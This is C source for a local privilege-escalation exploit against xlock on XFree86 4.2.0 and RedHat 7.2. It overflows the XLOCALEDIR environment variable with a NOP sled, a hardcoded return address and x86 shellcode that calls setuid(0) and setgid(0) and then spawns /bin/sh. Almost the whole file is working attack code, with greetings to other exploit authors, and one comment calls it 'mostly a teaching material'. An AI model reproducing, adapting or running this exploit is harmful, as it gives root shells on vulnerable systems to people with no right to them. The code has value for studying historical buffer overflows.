/*  xlock local root exploit for XFree 4.2.0, RedHat 7.2, 
 *  maybe others, based on overflowing XLOCALEDIR,
 *  by omega of the S.T.A.R. team. 
 *  This is a re-make of the original work for Slackware 8.1 
 *  by dcryptr && tarranta / oC.
 */
/*  Greetz go to: dcryptr && tarranta, dethy -at- synnergy.net, 
 *                mirapoint, ^sq, irian, Fooy :-). 
 */
/*  Oh, and yes, xlock probably isn't +s on your system, so this 
 *  is mostly a teaching material ;-)
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

#define OFFSET 	0	 /* varies, use 0 as default */
#define nop	0x90	 /* NOP on x86 is 0x90 */
#define BSIZE   5100	 /* size of our buffer */

/* thanks to dcryptr && tarranta, for noting that 
   the first setuid(0) gets ignored for some mysterious 
   reason and also for providing this shellcode. */
static char shellcode[] =
/* setuid(0); - ignored. */
 "\x31\xdb" /* xor %ebx,%ebx */
 "\x89\xd8" /* mov %ebx,%eax */
 "\xb0\x17" /* mov $0x17,%al */
 "\xcd\x80" /* int $0x80 */
 
 /* setuid(0); */
 "\x31\xdb" /* xor %ebx,%ebx */
 "\x89\xd8" /* mov %ebx,%eax */
 "\xb0\x17" /* mov $0x17,%al */
 "\xcd\x80" /* int $0x80 */
 
 /* setgid(0); */
 "\x31\xdb" /* xor %ebx,%ebx */
 "\x89\xd8" /* mov %ebx,%eax */
 "\xb0\x2e" /* mov $0x2e,%al */
 "\xcd\x80" /* int $0x80 */
 
 /* /bin/sh execve(); */
 "\x31\xc0" /* xor %eax,%eax */
 "\x50"     /* push %eax */
 "\x68\x2f\x2f\x73\x68" /* push $0x68732f2f */
 "\x68\x2f\x62\x69\x6e" /* push $0x6e69622f */
 "\x89\xe3" /* mov %esp,%ebx */
 "\x50"     /* push %eax */
 "\x53"     /* push %ebx */
 "\x89\xe1" /* mov %esp,%ecx */
 "\x31\xd2" /* xor %edx,%edx */
 "\xb0\x0b" /* mov $0xb,%al */
 "\xcd\x80" /* int $0x80 */
 
 /* exit(0); */
 "\x31\xdb" /* xor %ebx,%ebx */
 "\x89\xd8" /* mov %ebx,%eax */
 "\xb0\x01" /* mov $0x01,%al */
 "\xcd\x80";/* int $0x80 */
 
/* thanks to dethy for his tutorial on overflows 
 * - this is essentially based on that. 
 */
int main(int argc, char **argv) {
    char *buffer, *ptr;
    int *address_ptr, *address;
    int i, offset = OFFSET, bsize = BSIZE;

    /* you can use this offset to search for a better place to jump to. */
    if(argc > 1) offset = atoi(argv[1]);
    else offset = 0;
    fprintf(stderr, "Offset: %d\n", offset);

    /* create space for our buffer */
    buffer = malloc(bsize);

    /* use the force, read the source :-), determine %esp for xlock. */
    (char *)address = (0xbffff010 + sizeof(int) * offset);
    fprintf(stderr, "Return address: %#x\n" ,address);

    ptr = buffer;
    address_ptr = (int *)ptr;

    /* fill buffer with the in-buffer address to jump to. */
    for(i = 0; i < bsize; i += 4) (int *)*(address_ptr++) = address;

    /* now we fill the first third - this can be adjusted - of the buffer with nop's, 
       remembering to leave space for the remaining shellcode to be added. */
    for(i = 0; i < bsize / 3; i++) buffer[i] = nop;

    /* fill the buffer with the shellcode centered around the border between the 
       first and second third of the buffer. */
    ptr = buffer + ((bsize / 3) - (strlen(shellcode) / 2));
    for(i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i];
    
    /* don't forget to end with the dreaded null byte or the processor won't determine
       the end of our code. */
    buffer[bsize - 1] = '\0';

    /* in this case our bof is a user specified environment variable of fixed length, 
       so we set our buffer "$XLOCALEDIR" and that should overflow the programs buffer */

    setenv("XLOCALEDIR", buffer, 1);

    /* xlock uses the above variable for it's environment, so we'll try to exploit it. */
    execl("/usr/X11R6/bin/xlock", "/usr/X11R6/bin/xlock", 0);
}


